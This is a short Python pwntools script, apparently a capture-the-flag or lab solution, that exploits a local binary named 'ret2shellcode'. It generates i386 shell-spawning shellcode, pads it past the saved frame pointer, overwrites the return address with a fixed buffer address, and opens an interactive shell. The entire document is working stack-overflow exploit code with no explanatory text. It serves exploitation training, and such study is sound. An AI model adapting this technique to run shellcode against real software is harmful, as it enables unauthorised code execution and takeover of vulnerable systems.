from pwn import *
import pwnlib.util.packing

context(os='linux', arch='i386')

sh = process("./ret2shellcode")

addr_buf2 = 0x0804A080
addr_ebp = 0xffffd5d8
addr_s = 0xffffd56c

shellcode = asm(shellcraft.sh())

len_ebp = addr_ebp - addr_s

payload = shellcode.ljust(len_ebp+0x04, b'a') + packing.p32(addr_buf2)

sh.sendline(payload)
sh.interactive()